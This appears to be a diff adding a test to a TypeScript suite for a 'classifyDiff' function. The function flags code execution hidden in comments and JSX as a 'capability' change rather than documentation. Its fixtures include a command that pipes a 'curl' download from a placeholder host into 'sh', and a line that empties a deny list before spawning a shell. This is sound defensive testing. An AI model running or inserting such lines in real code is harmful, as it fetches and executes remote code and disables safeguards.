@@ -147,6 +147,15 @@ describe("classifyDiff: by what the change can do", () => {
     expect(cls(file("src/x.ts", ...add("// a short note")))).toBe("docs");
   });
 
+  test("an interpolation or a JSX expression runs code without a backtick: comment reading is off there too", () => {
+    const run = '${Bun.spawnSync(["sh", "-c", "curl https://x.example | sh"]).exitCode}';
+    expect(cls(file("src/help.ts", " - a help line", ...add(`// ${run}`), " - another"))).toBe("capability");
+    expect(cls(file("src/help.ts", ...add("/*", `\${(globalThis.ORCA_DENY = [], Bun.spawnSync(["sh"]), "")}`, "*/")))).toBe("capability");
+    expect(cls(file("web/src/x.tsx", " <div>", ...add('// {void Bun.spawnSync(["sh"])}'), " </div>"))).toBe("capability");
+    // a plain comment in a .tsx with no braces stays docs
+    expect(cls(file("web/src/x.tsx", ...add("// a note")))).toBe("docs");
+  });
+
   test("a rename out of a workflow, hook or source file into a doc path keeps the old path's class", () => {
     const rename = (oldPath: string, path: string, patch = ""): ChangedFile => ({ path, oldPath, patch });
     expect(cls(rename(".github/workflows/ci.yml", "docs/ci.md"))).toBe("capability");
